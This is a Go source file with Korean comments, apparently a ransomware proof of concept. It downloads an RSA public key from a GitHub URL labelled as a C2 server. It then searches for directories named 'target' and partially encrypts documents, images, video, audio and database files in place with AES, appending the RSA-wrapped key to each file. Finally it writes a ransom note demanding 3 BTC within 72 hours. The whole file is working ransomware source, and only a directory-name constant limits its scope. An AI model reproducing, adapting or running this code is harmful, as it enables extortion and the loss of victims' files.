package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// 타겟 상수 및 키 주소
const (
	SearchDir  = ".."     // 상위 디렉토리를 탐색 범위로 지정
	TargetName = "target" // 탐색할 특정 디렉토리 이름
	Stride     = 50       // 수십 바이트 단위로 점프
	BlockSize  = 16       // AES 블록 크기
	// 깃허브 Raw 주소
	C2PublicKeyURL = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/key/public.pem"
)

// 대상 확장자
var targetExtensions = map[string]bool{
	// 문서
	".txt": true, ".docx": true, ".xlsx": true, ".pptx": true, ".pdf": true, ".hwp": true,
	// 동영상
	".mp4": true, ".avi": true, ".mkv": true, ".wmv": true, ".mov": true, ".flv": true,
	// 사진
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true, ".webp": true,
	// 음성
	".mp3": true, ".wav": true, ".wma": true, ".flac": true, ".ogg": true,
	// DB
	".db": true, ".sqlite": true, ".sql": true, ".mdb": true,
}

// C2에서 RSA 공개키를 받는 함수
func getPublicKeyFromC2(url string) (*rsa.PublicKey, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("HTTP GET 실패: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("서버 응답 에러 (Status Code: %d)", resp.StatusCode)
	}

	pemBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("본문 읽기 실패: %v", err)
	}

	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, fmt.Errorf("PEM 디코딩 실패 (올바른 PEM 형식이 아닙니다)")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("공개키 파싱 실패: %v", err)
	}

	return pub.(*rsa.PublicKey), nil
}

// 파일 암호화 함수
func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
	// 무작위 AES 대칭키(32바이트) 생성
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return fmt.Errorf("AES 키 생성 실패: %w", err)
	}

	// 대상 파일 오픈
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return fmt.Errorf("파일 열기 실패: %w", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("파일 정보 가져오기 실패: %w", err)
	}
	fileSize := fileInfo.Size()

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return fmt.Errorf("AES Cipher 생성 실패: %w", err)
	}
	// 고정된 IV 사용 (PoC 목적)
	iv := make([]byte, BlockSize)
	mode := cipher.NewCBCEncrypter(block, iv)

	// 부분 암호화
	var offset int64 = 0
	buf := make([]byte, BlockSize)
	encBuf := make([]byte, BlockSize)
	encryptedBlocks := 0

	for offset+int64(BlockSize) <= fileSize {
		_, err := file.Seek(offset, 0)
		if err != nil {
			break
		}

		_, err = file.Read(buf)
		if err != nil {
			break
		}

		mode.CryptBlocks(encBuf, buf)

		_, _ = file.Seek(offset, 0)
		_, _ = file.Write(encBuf)

		encryptedBlocks++
		offset += int64(BlockSize) + int64(Stride)
	}

	// 사용된 AES 대칭키를 RSA 공개키로 암호화
	encryptedAESKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		publicKey,
		aesKey,
		nil,
	)
	if err != nil {
		return fmt.Errorf("RSA 대칭키 암호화 실패: %w", err)
	}

	// 암호화된 대칭키를 파일 끝에 푸터로 결합
	_, _ = file.Seek(0, 2)
	_, _ = file.Write([]byte("\n---ENC_KEY_START---"))
	_, _ = file.Write(encryptedAESKey)
	_, _ = file.Write([]byte("---ENC_KEY_END---"))

	fmt.Printf("[+] 암호화 완료: %s (총 %d개 블록 암호화됨)\n", filePath, encryptedBlocks)
	return nil
}

// 랜섬 노트 생성 함수
func CreateRansomNote() error {
	outputPath := filepath.Join(".", "README_FOR_DECRYPT.txt")
	currentTime := time.Now()
	deadlineTime := currentTime.Add(72 * time.Hour)
	timeFormat := "2006-01-02 15:04:05"
	formattedDeadline := deadlineTime.Format(timeFormat)
	noteContent := fmt.Sprintf(`[ WARNING: YOUR FILES ARE ENCRYPTED ]

당신의 소중한 target 폴더 안에 있는 파일들이 강력한 알고리즘으로 암호화되었습니다.
파일을 복구할 수 있는 유일한 방법은 복호화 키를 구매하는 것뿐입니다! :)

[ 당신이 파일을 복구할 수 있는 유일한 방법 ]
1. 아래의 가상자산 지갑 주소로 %s 전까지(72시간이내) 3 BTC를 송금하십시오.
   지갑주소 : TEST1BOB2WALLET3QGsd124546a1
2. 송금을 완료한 후, 아래의 이메일로 본인의 고유 ID와 함께 연락하십시오.
   이메일주소 : BoB-ransomwarehacker@proton.me

⚠️ 경고: 마감 시간이 지나면 복호화 키는 영구히 삭제되며, 파일을 절대 복구할 수 없습니다.
파일 확장자를 강제로 바꾸거나 임의로 수정할 경우 데이터가 영구 손상될 수 있으므로 참고 바랍니다.`, formattedDeadline)

	// 파일 생성 및 내용 쓰기
	err := os.WriteFile(outputPath, []byte(noteContent), 0644)
	if err != nil {
		return fmt.Errorf("랜섬노트 생성 실패: %v", err)
	}

	fmt.Printf("[+] 랜섬노트가 성공적으로 생성되었습니다: %s\n", outputPath)
	return nil
}

func main() {
	fmt.Println("[*] C2 서버에서 RSA 공개키 다운로드 시도 중...")
	publicKey, err := getPublicKeyFromC2(C2PublicKeyURL)
	if err != nil {
		fmt.Printf("[-] 실패: %v\n", err)
		return
	}
	fmt.Println("[+] RSA 공개키 성공적으로 수신 및 해독 완료")

	fmt.Printf("[*] '%s' 범위 내에서 '%s' 이름의 디렉토리 탐색 시작...\n", SearchDir, TargetName)
	err = filepath.WalkDir(SearchDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			if d != nil && d.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		if !d.IsDir() {
			return nil
		}

		// 디렉토리 명이 "target"인 경우에만 해당 내부 탐색 수행
		if d.Name() == TargetName {
			fmt.Printf("[+] 타겟 디렉토리 발견: %s\n", path)

			err := filepath.WalkDir(path, func(innerPath string, innerD os.DirEntry, innerErr error) error {
				if innerErr != nil {
					if innerD != nil && innerD.IsDir() {
						return filepath.SkipDir
					}
					return nil
				}
				if !innerD.Type().IsRegular() {
					return nil
				}

				ext := strings.ToLower(filepath.Ext(innerPath))
				if targetExtensions[ext] {
					fmt.Printf("[*] 암호화 대상 발견: %s\n", innerPath)
					if err := encryptFile(innerPath, publicKey); err != nil {
						fmt.Printf("[-] 파일 암호화 실패 (%s): %v\n", innerPath, err)
					}
				}
				return nil
			})
			if err != nil {
				return err
			}

			return filepath.SkipDir
		}

		return nil
	})

	if err != nil {
		fmt.Printf("[-] 디렉토리 탐색 중 에러 발생: %v\n", err)
		return
	}

	err = CreateRansomNote()
	if err != nil {
		fmt.Println("[-] 랜섬 노트 생성 중 에러 발생:", err)
	}
	fmt.Println("[+] 랜섬 노트 생성 완료.")

	fmt.Println("[+] 모든 대상 파일 암호화 시나리오 정상 종료.")
}
